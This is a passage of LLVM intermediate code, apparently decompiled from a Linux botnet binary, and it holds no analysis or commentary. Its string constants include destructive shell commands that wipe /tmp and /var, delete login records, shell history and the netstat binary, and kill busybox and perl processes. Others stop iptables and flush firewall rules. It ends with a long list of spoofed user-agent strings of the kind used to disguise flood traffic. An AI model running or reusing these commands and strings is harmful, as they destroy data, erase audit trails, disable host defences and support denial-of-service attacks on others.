getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_24f04.856, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_24f14.857, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_24f20.858, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_24f2c.859, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_24f3c.860, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_24f4c.861, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_24f5c.862, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_24f6c.863, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_24f78.864, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @global_var_24f88.865, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_24f9c.866, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_24fa8.867, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_24fb4.868, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_24fc4.869, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_24fd4.870, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_24fd8.871, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_24fdc.872, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_24fe0.873, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_24fe4.874, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_24fe8.875, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_24fec.876, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_24ff0.877, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_24ff4.878, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_24ff8.879, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_25000.880, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_25008.881, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_25010.882, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_25018.883, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_25020.884, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_25028.885, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_25030.886, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_25038.887, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_25040.888, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_25048.889, i32 0, i32 0), i8* getelementptr inbounds ([18 x i8], [18 x i8]* @global_var_25050.890, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_25064.891, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_25070.892, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_2507c.893, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_25088.894, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_25090.895, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_2509c.896, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_250a8.897, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_250b0.898, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_250bc.899, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_250c8.900, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_250d4.901, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_250e0.902, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_250ec.903, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_250f8.904, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_25104.905, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_2510c.906, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_25114.907, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_25120.908, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_2512c.909, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_25138.910, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_25144.911, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_25150.912, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_2515c.913, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_25170.914, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_2517c.915, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_25188.916, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_25194.917, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_251a0.918, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_251ac.919, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_251b8.920, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_251c4.921, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_251d0.922, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_251dc.923, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_251e4.924, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_251ec.925, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_251f8.926, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_25204.927, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_25210.928, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_2521c.929, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_25228.930, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_25234.931, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_25248.932, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_25254.933, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_25260.934, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_2526c.935, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_25278.936, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_25284.937, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_25290.938, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_2529c.939, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_252a8.940, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_252b4.941, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_252bc.942, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_252c4.943, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_252d0.944, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_252dc.945, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_252e8.946, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_252f4.947, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_25300.948, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_2530c.949, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_25320.950, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_2532c.951, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_25338.952, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_25344.953, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_25350.954, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_25360.955, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_25370.956, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_25380.957, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_25390.958, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_253a0.959, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_253ac.960, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_253b8.961, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_253c8.962, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_253d8.963, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_253e8.964, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_253f8.965, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_25408.966, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @global_var_25418.967, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_25430.968, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_25440.969, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_25450.970, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_25460.971, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_25470.972, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_24db4.833, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_2547c.973, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_25488.974, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_25490.975, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_25498.976, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_254a0.977, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_254a8.978, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_254b0.979, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_254b8.980, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_254c0.981, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_254c8.982, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_254d0.983, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_254d8.984, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_254e0.985, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_254e8.986, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_254f0.987, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_254f8.988, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_25500.989, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_25508.990, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_25510.991, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_25518.992, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_25520.993, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_25528.994, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_2552c.995, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_25530.996, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_25534.997, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_25538.998, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_2553c.999, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_25540.1000, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_25544.1001, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_25548.1002, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_2554c.1003, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_25550.1004, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_25554.1005, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_25558.1006, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_2555c.1007, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_25560.1008, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_25564.1009, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_25568.1010, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_2556c.1011, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_25570.1012, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_25574.1013, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_25578.1014, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_2557c.1015, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_25588.1016, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_25590.1017, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_25598.1018, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_255a0.1019, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_255a4.1020, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_255a8.1021, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_255ac.1022, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_255b0.1023, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_255b4.1024, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_255b8.1025, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_255bc.1026, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_255c0.1027, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_255c4.1028, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_255cc.1029, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_255d4.1030, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_255dc.1031, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_255e4.1032, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_255ec.1033, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_255f4.1034, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_255fc.1035, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_25604.1036, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_2560c.1037, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_25614.1038, i32 0, i32 0)]
@global_var_266a0.1041 = constant [100 x i8] c">%s.t && cd %s && for a in `ls -a %s`; do >$a; done; >retrieve ;echo ps aux >> proc ; pkill -9 %d\0D\0A\00"
@global_var_26724.1045 = constant [14 x i8] c"pkill -9 %s\0D\0A\00"
@global_var_fc04.1046 = constant i32 -442564500
@global_var_26734.1048 = constant [43 x i8] c"rm -rf /tmp/* /var/* /var/run/* /var/tmp/*\00"
@global_var_26760.1050 = constant [21 x i8] c"rm -rf /var/log/wtmp\00"
@global_var_26778.1052 = constant [22 x i8] c"history -c;history -w\00"
@global_var_26790.1054 = constant [14 x i8] c"rm -rf /tmp/*\00"
@global_var_267a0.1056 = constant [11 x i8] c"history -c\00"
@global_var_267ac.1058 = constant [23 x i8] c"rm -rf ~/.bash_history\00"
@global_var_267c4.1060 = constant [20 x i8] c"rm -rf /bin/netstat\00"
@global_var_267d8.1062 = constant [11 x i8] c"history -w\00"
@global_var_267e4.1064 = constant [17 x i8] c"pkill -9 busybox\00"
@global_var_267f8.1066 = constant [14 x i8] c"pkill -9 perl\00"
@global_var_26808.1068 = constant [22 x i8] c"service iptables stop\00"
@global_var_26820.1070 = constant [36 x i8] c"/sbin/iptables -F;/sbin/iptables -X\00"
@global_var_ffdc.1071 = constant i32 162764
@global_var_2686c.1072 = constant [62 x i8] c"Mozilla/5.0 (compatible; Konqueror/3.0; i686 Linux; 20021117)\00"
@global_var_268ac.1073 = constant [64 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5\00"
@global_var_268ec.1074 = constant [144 x i8] c"Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10\00"
@global_var_2697c.1075 = constant [55 x i8] c"Mozilla/5.0 Galeon/1.0.3 (X11; Linux i686; U;) Gecko/0\00"
@global_var_269b4.1076 = constant [32 x i8] c"Opera/6.04 (Windows XP; U) [en]\00"
@global_var_269d4.1077 = constant [24 x i8] c"Opera/9.99 (X11; U; sk)\00"
@global_var_269ec.1078 = constant [86 x i8] c"Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5\00"
@global_var_26a44.1079 = constant [157 x i8] c"Mozilla/5.0(iPad; U; CPU iPhone OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B314 Safari/531.21.10gin_lib.cc\00"
@global_var_26ae4.1080 = constant [82 x i8] c"Mozilla/5.0 Galeon/1.2.9 (X11; Linux i686; U;) Gecko/20021213 Debian/1.2.9-0.bunk\00"
@global_var_26b38.1081 = constant [115 x i8] c"Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41\00"
@global_var_26bac.1082 = constant [63 x i8] c"Mozilla/5.0 (compatible; iCab 3.0.3; Macintosh; U; PPC Mac OS)\00"
@global_var_26bec.1083 = constant [182 x i8] c"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0\00"
@global_var_26ca4.1084 = constant [83 x i8] c"Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9a8) Gecko/2007100620 GranParadiso/3.1\00"
@global_var_26cf8.1085 = constant [88 x i8] c"Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)\00"
@global_var_26d50.1086 = constant [88 x i8] c"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4\00"
@global_var_26da8.1087 = constant [64 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201\00"
@global_var_26de8.1088 = constant [69 x i8] c"Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911\00"
@global_var_26e30.1089 = constant [88 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2\00"
@global_var_26e88.1090 = constant [106 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)\00"
@global_var_26ef4.1091 = constant [87 x i8] c"Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285\00"
@global_var_26f4c.1092 = constant [80 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7\00"
@global_var_26f9c.1093 = constant [34 x i8] c"Mozilla/5.0 (PLAYSTATION 3; 3.55)\00"
@global_var_26fc0.1094 = constant [91 x i8] c"Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Thunderbird/38.2.0 Lightning/4.0.2\00"
@global_var_2701c.1095 = constant [15 x i8] c"wii libnup/1.0\00"
@global_var_2702c.1096 = constant [47 x i8] c"Mozilla/4.0 (PSP (PlayStation Portable); 2.00)\00"
@global_var_2705c.1097 = constant [33 x i8] c"PSP (PlayStation Portable); 2.00\00"
@global_var_27080.1098 = constant [34 x i8] c"Bunjalloo/0.7.6(Nintendo DS;U;en)\00"
@global_var_270a4.1099 = constant [26 x i8] c"Doris/1.15 [en] (Symbian)\00"
@global_var_270c0.1100 = constant [61 x i8] c"BlackBerry7520/4.0.0 Profile/MIDP-2.0 Configuration/CLDC-1.1\00"
@global_var_27100.1101 = constant [140 x i8] c"BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100findlinks/2.0.1 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_2718c.1102 = constant [69 x i8] c"findlinks/1.1.6-beta6 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_271d4.1103 = constant [69 x i8] c"findlinks/1.1.6-beta4 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_2721c.1104 = constant [69 x i8] c"findlinks/1.1.6-beta1 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_27264.1105 = constant [69 x i8] c"findlinks/1.1.5-beta7 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_272ac.1106 = constant [81 x i8] c"Mozilla/5.0 (Windows; U; WinNT; en; rv:1.0.2) Gecko/20030311 Beonex/0.8.2-stable\00"
@global_var_27300.1107 = constant [78 x i8] c"Mozilla/5.0 (Windows; U; WinNT; en; Preview) Gecko/20020603 Beonex/0.8-stable\00"
@global_var_27350.1108 = constant [105 x i8] c"Mozilla/5.0 (X11; U; Linux i686; nl; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2 (Debian-1.99+2.0b2+dfsg-1)\00"
@global_var_273bc.1109 = constant [81 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2\00"
@global_var_27410.1110 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1b2) Gecko/20060826 BonEcho/2.0b2\00"
@global_var_2746c.1111 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.8.1b2) Gecko/20060831 BonEcho/2.0b2\00"
@global_var_274c8.1112 = constant [97 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-GB; rv:1.8.1b1) Gecko/20060601 BonEcho/2.0b1 (Ubuntu-edgy)\00"
@global_var_2752c.1113 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a3) Gecko/20060526 BonEcho/2.0a3\00"
@global_var_27588.1114 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2\00"
@global_var_275e4.1115 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2\00"
@global_var_27640.1116 = constant [96 x i8] c"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2\00"
@global_var_276a0.1117 = constant [71 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)\00"
@global_var_276e8.1118 = constant [150 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: unblock4myspace)AppEngine-Google; (+http://code.google.com/appengine; appid: tunisproxy)\00"
@global_var_27780.1119 = constant [74 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-in-rs)\00"
@global_var_277cc.1120 = constant [73 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-ba-k)\00"
@global_var_27818.1121 = constant [78 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: moelonepyaeshan)\00"
@global_var_27868.1122 = constant [71 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: mirrorrr)\00"
@global_var_278b0.1123 = constant [84 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: mapremiereapplication)\00"
@global_var_27904.1124 = constant [79 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: longbows-hideout)\00"
@global_var_27954.1125 = constant [70 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: eduas23)\00"
@global_var_2799c.1126 = constant [74 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: craigserver)\00"
@global_var_279e8.1127 = constant [73 x i8] c"AppEngine-Google; ( http://code.google.com/appengine; appid: proxy-ba-k)\00"
@global_var_27a34.1128 = constant [71 x i8] c"magpie-crawler/1.1 (U; Linux amd64; en-GB; +http://www.brandwatch.net)\00"
@global_var_27a7c.1129 = constant [80 x i8] c"Mozilla/5.0 (compatible; MJ12bot/v1.2.4; http://www.majestic12.co.uk/bot.php?+)\00"
@global_var_27acc.1130 = constant [80 x i8] c"Mozilla/5.0 (compatible; MJ12bot/v1.2.3; http://www.majestic12.co.uk/bot.php?+)\00"
@global_var_27b1c.1131 = constant [51 x i8] c"MJ12bot/v1.0.8 (http://majestic12.co.uk/bot.php?+)\00"
@global_var_27b50.1132 = constant [51 x i8] c"MJ12bot/v1.0.7 (http://majestic12.co.uk/bot.php?+)\00"
@global_var_27b84.1133 = constant [72 x i8] c"Mozilla/5.0 (compatible; MojeekBot/2.0; http://www.mojeek.com/bot.html)\00"
@global_var_27bcc.1134 = constant [62 x i8*] [i8* getelementptr inbounds ([62 x i8], [62 x i8]* @global_var_2686c.1072, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @global_var_268ac.1073, i32 0, i32 0), i8* getelementptr inbounds ([144 x i8], [144 x i8]* @global_var_268ec.1074, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @global_var_2697c.1075, i32 0, i32 0), i8* getelementptr inbounds ([32 x i8], [32 x i8]* @global_var_269b4.1076, i32 0, i32 0), i8* getelementptr inbounds ([24 x i8], [24 x i8]* @global_var_269d4.1077, i32 0, i32 0), i8* getelementptr inbounds ([86 x i8], [86 x i8]* @global_var_269ec.1078, i32 0, i32 0), i8* getelementptr inbounds ([157 x i8], [157 x i8]* @global_var_26a44.1079, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @global_var_26ae4.1080, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @global_var_26b38.1081, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @global_var_26bac.1082, i32 0, i32 0), i8* getelementptr inbounds ([182 x i8], [182 x i8]* 